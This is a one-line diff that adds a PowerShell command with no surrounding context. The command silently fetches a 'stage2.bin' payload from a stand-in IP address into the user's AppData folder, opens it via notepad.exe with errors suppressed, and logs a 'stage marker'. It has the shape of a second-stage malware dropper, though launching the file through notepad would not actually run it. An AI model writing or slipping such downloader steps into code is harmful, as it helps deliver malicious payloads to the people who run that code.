@@ -1,0 +1,1 @@
+$TargetUrl = "http://192.0.2.226/stage2.bin"; $Stage2Path = "$env:APPDATA\payload.bin"; curl.exe -s -L -o $Stage2Path $TargetUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Verbose "stage marker 14 reached"
